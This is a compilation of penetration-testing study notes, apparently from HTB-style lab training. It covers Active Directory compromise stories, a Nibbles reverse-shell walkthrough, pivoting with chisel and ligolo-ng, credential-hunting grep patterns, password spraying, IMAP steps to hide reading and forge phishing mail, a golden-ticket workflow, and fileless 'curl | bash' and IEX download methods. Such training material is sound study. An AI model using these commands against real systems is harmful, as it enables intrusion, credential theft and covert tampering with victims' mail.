title: Real-World examples (important- learn from this)
context: During this engagement, I compromised a single host and gained  SYSTEM  level access. Because this was a domain-joined host, I was able to use this access to enumerate the domain. I went through all of the standard enumeration, but did not find much. There were  Service Principal Names  (SPNs) present within the environment, and I was able to perform a Kerberoasting attack and retrieve TGS tickets for a few accounts. I attempted to crack these with Hashcat and some of my standard wordlists and rules, but was unsuccessful at first. I ended up leaving a cracking job running overnight with a very large wordlist combined with the  d3ad0ne  rule that ships with Hashcat. The next morning I had a hit on one ticket and retrieved the cleartext password for a user account. This account did not give me significant access, but it did give me write access on certain file shares. I used this access to drop SCF files around the shares and left Responder going. After a while, I got a single hit, the  NetNTLMv2 hash  of a user. I checked through the BloodHound output and noticed that this user was actually a domain admin! Easy day from here.
subject: ad

title: Real-World examples (important- learn from this)
context: Password spraying can be an extremely effective way to gain a foothold in a domain, but we must exercise great care not to lock out user accounts in the process. On one engagement, I found an SMB NULL session using the  enum4linux  tool and retrieved both a listing of  all  users from the domain, and the domain  password policy . Knowing the password policy was crucial because I could ensure that I was staying within the parameters to not lock out any accounts and also knew that the policy was a minimum eight-character password and password complexity was enforced (meaning that a user's password required 3/4 of special character, number, uppercase, or lower case number, i.e., Welcome1). I tried several common weak passwords such as Welcome1,  Password1 , Password123,  Spring2018 , etc. but did not get any hits. Finally, I made an attempt with  Spring@18  and got a hit! Using this account, I ran BloodHound and found several hosts where this user had local admin access. I noticed that a domain admin account had an active session on one of these hosts. I was able to use the Rubeus tool and extract the Kerberos TGT ticket for this domain user. From there, I was able to perform a  pass-the-ticket  attack and authenticate as this domain admin user. As a bonus, I was able to take over the trusting domain as well because the Domain Administrators group for the domain that I took over was a part of the Administrators group in the trusting domain via nested group membership, meaning I could use the same set of credentials to authenticate to the other domain with full administrative level access.
subject: ad

title: Technical walkthrough
context: Initial reconnaissance with  nmap -sC -sV  identified two services on the target: OpenSSH 7.2p2 on TCP/22 and Apache httpd 2.4.18 on TCP/80. The web root served a minimal "Hello world" page, but an HTML comment in the source referenced a  /nibbleblog/  subdirectory.  whatweb  confirmed Nibbleblog as the CMS, and directory enumeration with  gobuster  against  /nibbleblog/  exposed  /README  (disclosing version 4.0.3),  /admin.php , and  /content/ . Nibbleblog 4.0.3 is vulnerable to  CVE-2015-6967 , an authenticated arbitrary file upload in the "My Image" plugin.
subject: practice

title: Technical walkthrough
context: The admin username  admin  was recovered from  /nibbleblog/content/private/users.xml , exposed by directory listing. Brute-force authentication was mitigated by an IP-blacklist defense, so the password was instead guessed as  nibbles  (the site name) and accepted on the first attempt. From the admin panel, the My Image plugin accepted a PHP file ( image.php ) containing a netcat-based reverse shell, which was triggered by requesting  /nibbleblog/content/private/plugins/my_image/image.php  while listening with  nc -lvnp 9443 . The returned shell was upgraded with  python3 -c 'import pty; pty.spawn("/bin/bash")'  and ran as user  nibbler , yielding  user.txt .
subject: practice

title: 1. SSH port forwarding (no tools needed)
page: Pivoting and File Transfer: Field Reference
code:
# Dynamic (-D): a SOCKS proxy → reach the WHOLE subnet via proxychains
ssh -D 1080 jbetty@<DMZ_IP>
#   /etc/proxychains4.conf -> socks5 127.0.0.1 1080 ; then:
proxychains nxc smb 172.16.119.11 -u user -p pass

# Local (-L): map ONE internal service to a Kali local port (great for RDP)
ssh -L 13389:172.16.119.7:3389 jbetty@<DMZ_IP>
xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore     # no proxychains

# Remote (-R): make a Kali service reachable FROM the pivot side (reverse)
ssh -R 8000:127.0.0.1:8000 jbetty@<DMZ_IP>      # DMZ's :8000 -> Kali's :8000

title: 2. chisel (SOCKS + port forwards)
page: Pivoting and File Transfer: Field Reference

# Kali (server, reverse mode)
./chisel server -p 9001 --reverse
# pivot host (client) — reverse SOCKS:
./chisel client <KALI_IP>:9001 R:1080:socks
#   -> SOCKS5 on Kali 127.0.0.1:1080 ; use proxychains

# single reverse port forward (e.g. expose internal RDP on Kali:13389):
./chisel client <KALI_IP>:9001 R:13389:172.16.119.7:3389

# forward a Kali service INTO the network (internal host can reach Kali:8000):
./chisel client <KALI_IP>:9001 R:172.16.119.13:8000:127.0.0.1:8000

title: 3. ligolo‑ng (transparent TUN — best for RDP/scanning)
page: Pivoting and File Transfer: Field Reference
code:
# Kali — one-time interface setup
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
# Kali — start the proxy (listens on 11601)
sudo ./proxy -selfcert
# pivot host — run the agent (upload it first)
./agent -connect <KALI_IP>:11601 -ignore-cert
# Kali — in the ligolo console:
session            # pick the agent
start              # activate the tunnel
# Kali — route the internal subnet through ligolo
sudo ip route add 172.16.119.0/24 dev ligolo
# now everything just works:
nxc smb 172.16.119.11 -u user -p pass
xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
nmap -sT 172.16.119.0/24

USER username      # 1. specify the account

title: Driving POP3

title: Driving IMAP
page: Read and Search Email with POP3 and IMAP
code:
a1 LOGIN user pass     # 1. authenticate
a2 LIST "" "*"         # 2. list ALL folders (custom/hidden folders are where the good stuff hides)
a3 SELECT "INBOX"      # 3. open a folder before reading from it
a4 FETCH 1 BODY[]      # 4. read the full content of message 1
a5 FETCH 1 (FLAGS)     # 5. check a message's flags (e.g. \Seen = already read)

title: Driving IMAP
page: Read and Search Email with POP3 and IMAP
code:
# Find credentials across an entire large mailbox in one query:
a6 SEARCH TEXT "password"

# Cover your tracks — mark a message you read back as Unread:
a7 STORE 1 -FLAGS (\Seen)

# Delete and permanently purge a message:
a8 STORE 1 +FLAGS (\Deleted)
a9 EXPUNGE

# Forge a message straight into the mailbox (e.g. plant a phishing link):
# {52} is the exact byte length of the literal that follows, INCLUDING the \r\n line endings.
a10 APPEND INBOX {52}
Subject: Fake Email
Here is the malicious link.

title: How NFS actually works
context: Because the server trusts the client's UID, you control the UID on  your  box. If you know a file is owned by UID 1005, you create a local user with  useradd -u 1005  (or just  sudo , which runs as UID 0), mount the share, and you now have that user's access to the files. The server never verifies you're really that person.

title: How SMTP actually works
code:
HELO attacker.com            # (or EHLO) introduce yourself; EHLO lists server capabilities
MAIL FROM:<sender@x.com>     # who the mail is from (the "envelope sender")
RCPT TO:<victim@target.com>  # who it's going to (the server checks if this mailbox exists)
DATA                         # begin the message body
Subject: hi
...message...
.                            # a single dot on its own line ends the message
QUIT
subject: recon

title: How SMTP actually works
context: The server validates recipients.  When you send  RCPT TO:<user> , the server has to decide whether that mailbox exists — and it answers  differently  for real vs fake addresses. That difference leaks the user list.

title: WMI (Windows Management Instrumentation)
page: Windows Remote Access: RDP, WinRM, and WMI
context: WMI is Windows' built-in management framework — it can answer almost any question about a system (OS, processes, installed software, services) and  create processes remotely . Attackers love it because execution via WMI is  fileless and stealthy  (no service installed, blends into normal admin activity), which is why  wmiexec.py  is a favourite.

title: Enumeration Workflow
page: Windows Remote Access: RDP, WinRM, and WMI

1. Port scan → 3389, 5985, 5986, 135
2. RDP open?   → nmap rdp* (hostname/domain/NLA) → rdp-sec-check.pl (encryption)
3. WinRM open? → evil-winrm with found creds (or -H hash)
4. WMI (135)?  → wmiexec.py with creds → stealthy command exec
5. Got creds?  → try ALL three + test password reuse across hosts

title: Mental model
code:
Have a vuln + MSF module?  → search → use → set RHOSTS/LHOST/PAYLOAD → run
No module, but can run a file? → msfvenom payload → multi/handler to catch it
Got a session?  → sessions -i, background, sessions -u (upgrade to meterpreter)
In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
Need the internal net? → autoroute + socks_proxy → proxychains everything else
Always: LHOST = your tun0, payload in venom must match the handler

title: Fully stabilising a shell (the upgrade you'll use constantly)
context: pty.spawn  gives you a prompt, but it's still a "dumb" shell: no tab-completion, no arrow keys/history, and  Ctrl-C  kills your whole shell  instead of the running command. The full stabilization below turns it into a near-native terminal. It matters because half-broken shells get you killed mid-engagement — you fat-finger  Ctrl-C , lose the session, and have to re-exploit.
subject: systems

title: Fully stabilising a shell (the upgrade you'll use constantly)
code:
# 1. On the TARGET shell — spawn a proper PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background the shell: press Ctrl-Z (drops you back to your LOCAL terminal)

# 3. On YOUR box — set the local terminal to raw and re-foreground the shell
stty raw -echo; fg
#   stty raw -echo = stop the local terminal from intercepting keys/signals
#   fg             = bring the backgrounded remote shell back (press Enter once or twice)

# 4. Back on the TARGET — declare your terminal type and size so editors/clear work
export TERM=xterm
export SHELL=/bin/bash
stty rows 38 columns 116        # use your real size — check with `stty size` locally first
subject: systems

title: Fully stabilising a shell (the upgrade you'll use constantly)

title: Find Credentials in Network Shares
code:
# the domain prefix (most reliable signal)
grep -ri "DOMAINNAME\\\\" .

# UPN format
grep -riE "[a-z]+@domain\.local" .

# runas / net use / Invoke-Command patterns - operators leak creds in commands
grep -riE "runas|net use|Invoke-Command|New-PSSession|ConvertTo-SecureString" .

# anything with "service account" / "svc_" in filenames
find . -iname "*svc*" -o -iname "*service*account*"
subject: systems

title: 1. Domain-prefixed accounts (highest signal)
code:
# the gold filter - DOMAIN\username syntax
grep -ri "${DOMAIN}\\\\" . 2>/dev/null

# UPN format
grep -riE "[a-zA-Z0-9._-]+@inlanefreight\.local" . 2>/dev/null
subject: systems

title: 2. Cred-context keywords (medium-high signal)
code:
# password / pwd / passwd with assignment
grep -riE "(pass(word)?|pwd|passwd)[[:space:]]*[:=][[:space:]]*\S+" . 2>/dev/null | grep -v Tools/

# variations - localized & abbreviated
grep -riE "passw|kennwort|contraseña|mot.de.passe|senha" . 2>/dev/null

# user/account context
grep -riE "(username|userid|account|login)[[:space:]]*[:=]" . 2>/dev/null | grep -v Tools/
subject: systems

title: 3. Credential-handling patterns in scripts
code:
# PowerShell cred patterns - extremely high signal
grep -riE "ConvertTo-SecureString|New-PSCredential|PSCredential|-AsPlainText" . 2>/dev/null
grep -riE "Invoke-Command.*-Credential|New-PSSession.*-Credential" . 2>/dev/null

# Windows command-line auth
grep -riE "net use .*\\\\.*/user:|runas.*\/user:|psexec.*-u " . 2>/dev/null

# connection strings
grep -riE "(server|data source|host)=.*;.*(user|uid)=.*;.*(pass|pwd)=" . 2>/dev/null
subject: systems

title: 4. API/token/key patterns
code:
grep -riE "(api[_-]?key|api[_-]?token|secret[_-]?key|access[_-]?token|bearer)[[:space:]]*[:=]" . 2>/dev/null
grep -riE "aws_access_key_id|aws_secret_access_key" . 2>/dev/null

# obvious high-entropy / base64-ish blocks near "key" or "secret"
grep -riE "[A-Za-z0-9+/]{40,}" . 2>/dev/null | grep -iE "key|secret|token"
subject: systems

title: 5. Filename-based hunting
code:
# files with interesting names
find . -type f \( -iname "*pass*" -o -iname "*cred*" -o -iname "*secret*" -o -iname "*config*" -o -iname "*backup*" -o -iname "*initial*" -o -iname "unattend*" -o -iname "sysprep*" -o -iname "autounattend*" \) 2>/dev/null | grep -v Tools/

# password manager databases
find . -type f \( -iname "*.kdbx" -o -iname "*.psafe3" -o -iname "*.1pux" \) 2>/dev/null

# files by interesting extension
find . -type f \( -iname "*.ini" -o -iname "*.cfg" -o -iname "*.conf" -o -iname "*.config" -o -iname "*.env" -o -iname "*.ps1" -o -iname "*.bat" -o -iname "*.cmd" -o -iname "*.vbs" -o -iname "*.xml" \) 2>/dev/null | grep -v Tools/
subject: systems

title: 6. GPP / SYSVOL gold
code:
# cpassword in any XML (GPP)
grep -ri "cpassword" . 2>/dev/null

# autologon in Registry.pol
strings SYSVOL/**/Registry.pol 2>/dev/null | grep -iE "DefaultPassword|DefaultUserName|AutoAdminLogon"

# show 3 lines of context - critical for matching user to password
grep -riE -C 3 "password" . 2>/dev/null | grep -v Tools/

# show filename + line + match
grep -rniE "passw" . 2>/dev/null | grep -v Tools/

title: Concept deep‑dives
page: Pass the Certificate: PKINIT and Lab Walkthrough
context: DCSync.  Domain Controllers replicate directory data (including password hashes) between each other over the MS‑DRSR protocol. Any account with the  Replicating Directory Changes (All)  rights can ask a DC to send those hashes. The  Domain Controllers  group has these rights by default, so a  DC01$  ticket can DCSync any user's hash.

title: Import a Stolen Ticket
code: cp: cannot stat ...: No such file or directory
context: SSSD keeps rotating the caches.  On an SSSD-joined host the ccache filenames change every few minutes (e.g.  krb5cc_647401106_HRJDux  →  ..._xXx52K , timestamps keep updating). A name you saw seconds ago can vanish — that's the  cp: cannot stat ...: No such file or directory  error. Re-run  ls -la /tmp  immediately before copying, grab the freshest file for your target principal, and copy it to a stable name right away so rotation can't pull it out from under you.
subject: ad

context: Kerberos ticket expired  even on a fresh ticket / KDC reached OK Clock skew  — your attack host's time differs from the domain's (HTB labs run on a fixed date, e.g. 2022). Restore later with  sudo timedatectl set-ntp on

title: Where it fits in a pentest
context: PtT is core  lateral movement  in an AD engagement. Typical chain: land on a box →  sekurlsa::ekeys / tickets  or  Rubeus dump  → grab a privileged user's TGT (or  asktgt  from their key) → inject →  Enter-PSSession / impacket  to the next host or the DC. It's preferred over PtH when the environment is Kerberos-only or you want to stay AES-native and quieter. It also chains from other attacks that  yield  tickets: Kerberoasting, AS-REP roasting, unconstrained delegation, and  Pass the Certificate  (PKINIT → TGT).
subject: ad

title: 🔁 Mutating a known OLD password (the stom case)
page: Password Attacks: Cracking, Files, and Credential Stores
code:
# 1. base word
echo 'fails-nibble-disturb4' > base.txt
# 2. generate variants with rules (increment digit, toggle case, append symbol/year)
hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule | sort -u > muts.txt
# tight hand-list when lockout is a risk:
printf '%s\n' fails-nibble-disturb5 fails-nibble-disturb6 Fails-nibble-disturb4 \
  fails-nibble-disturb4! fails-nibble-disturb5! fails-nibble-disturb2025 fails-nibble-disturb2026 >> muts.txt
# 3. spray the mutations (CAREFULLY — see lockout below)
proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]'
subject: systems

title: The authentication flow (memorize this)
code:
┌────────────────────── KDC (on the DC) ──────────────────────┐
   1. AS-REQ ──►│ AS: validate pre-auth (timestamp encrypted with USER key)   │
   2. AS-REP ◄──│ returns  TGT (enc. with krbtgt key) + session key           │
   3. TGS-REQ ─►│ TGS: present TGT + SPN you want                             │
   4. TGS-REP ◄─│ returns  service ticket (enc. with SERVICE key) + sess key  │
                └─────────────────────────────────────────────────────────────┘
   5. AP-REQ ──► present the service ticket directly to the target service
                 (service decrypts it with its own key — never contacts KDC for your secret)
subject: systems

DOWNLOADING TO WINDOWS:
├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
├── Only cmd.exe?       → certutil or bitsadmin
├── Internal network?   → SMB (impacket-smbserver)
├── Need fileless?      → IEX + DownloadString
└── Nothing works?      → Base64 encode/decode via clipboard

DOWNLOADING TO LINUX:
├── Have curl/wget?     → Use them (simplest)
├── Need fileless?      → curl | bash  or  wget -qO- | python3
├── Have Python/PHP?    → Use language one-liners
├── Nothing available?  → /dev/tcp bash trick
└── Need encryption?    → OpenSSL s_server/s_client

UPLOADING FROM WINDOWS:
├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
├── Internal network?   → SMB or WebDAV
└── Nothing works?      → Base64 encode → copy-paste → decode on attacker

UPLOADING FROM LINUX:
├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
├── Have SCP?           → scp file user@attacker:/path/
├── Have Python?        → python3 requests.post one-liner
└── Nothing works?      → Start python3 -m http.server on target, wget from attacker

title: Mental Model — "What Do I Use When?"
page: Ports, Protocols, and Services by Purpose
code:
"I found an open port"
├── Is it a file share?    → SMB (445), NFS (2049), FTP (21)
├── Is it remote access?   → SSH (22), RDP (3389), WinRM (5985)
├── Is it a web server?    → HTTP (80/443) → fingerprint → fuzz
├── Is it email?           → SMTP (25), IMAP (143), POP3 (110)
├── Is it a database?      → MySQL (3306), MSSQL (1433), Oracle (1521)
├── Is it monitoring?      → SNMP (161), IPMI (623)
└── Not sure?              → nmap -sV -sC <IP> -p <port>

"I need to get files off the target"
├── Linux → scp/sftp (22)
├── Windows → SMB (445) or evil-winrm download
├── Web → wget/curl
└── Simple → python3 -m http.server (on target)

"I need to get files onto the target"
├── Linux → scp/sftp (22) or wget from attacker
├── Windows → SMB, certutil, PowerShell wget
├── Web upload → if upload form exists
└── Simple → python3 -m http.server (on attacker)

"I need a shell"
├── Linux → SSH (22)
├── Windows → Evil-WinRM (5985), PsExec (445), RDP (3389)
└── Either → reverse shell via exploit

title: 10. Ghidra — reading the native crypto
context: The decrypt routine — its structure was textbook  AES in CBC mode : each 16-byte block decrypted, then XOR-ed with the previous ciphertext block; the first IV came from a setup function that loaded the first 16 bytes of input. The inverse S-box at a known offset matched the  standard  AES inverse S-box exactly ( 52 09 6a d5 ... ) — so no custom tables.

title: The string of slip-ups getting the harness to run
context: libc.so: version 'LIBC' not found  — the Android library imports standard C functions ( malloc ,  memcpy ,  fopen ...) but tagged with Android's bionic version name  LIBC , which glibc doesn't provide. A symlink to the real glibc failed for this reason. The fix was a custom stub  libc.so  exporting exactly the 11 needed functions under the  LIBC  version, each forwarding to real glibc.
subject: practice

title: The string of slip-ups getting the harness to run
context: Infinite recursion / stack-overflow segfault  — the first stub libc aliased its own functions to the same names it was forwarding to, so  memcpy  called itself forever until the stack ran out (the QEMU register dump showed SP marching down by 0x20 each frame until it hit unmapped memory). The fix was resolving the  real  glibc functions via  dlsym(RTLD_NEXT, ...)  so there was no name collision.

#   The workflow is as follows:
#       Input:
#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
#              The domain specified MUST be the domain FQDN.
#           2) Optionally a pathname to save the generated golden ticket (-w switch)
#           3) Optionally a target-user RID to get credentials (-targetRID switch)
#              Administrator by default.
#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
#              Enterprise Admin by default.
#
#       Process:
#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
#           2) Find out what the forest FQDN is (via [MS-NRPC])
#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
#              and setting expiration 10 years from now
#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
#           7) If file was specified, save the golden ticket in ccache format
#           8) If target was specified, a PSEXEC shell is launched
#
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.

title: Example 3: How to spot it on a scan
code:
nmap -p53 -sU -sV <IP>                       # UDP 53 = DNS service + version (often BIND x.x.x)

subject: recon

title: Example 4: The headline attack: DNS Zone Transfer (AXFR)
code:
dig axfr <domain> @<nameserver-IP>            # request a full zone transfer
dig axfr internal.target.com @10.10.10.5      # internal zones are the real jackpot

# Alternatives
host -l <domain> <nameserver-IP>              # -l = list zone (attempt AXFR)
fierce --domain <domain>                       # tries AXFR, then falls back to brute force
dnsrecon -d <domain> -t axfr                   # zone transfer attempt
subject: recon

title: Example 5: When AXFR is blocked: enumerate the hard way
code:
# Individual record lookups
dig A target.com @<IP>            # host → IPv4
dig MX target.com @<IP>           # mail servers
dig NS target.com @<IP>           # name servers
dig TXT target.com @<IP>          # SPF/DKIM/verification strings
dig ANY target.com @<IP>          # everything the server will return at once

# Reverse lookups across a subnet (PTR records → hostnames)
dnsrecon -r 10.10.10.0/24 -n <IP>

# Subdomain brute force (guess names, keep the ones that resolve)
dnsenum --dnsserver <IP> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <domain>
gobuster dns -d <domain> -r <IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
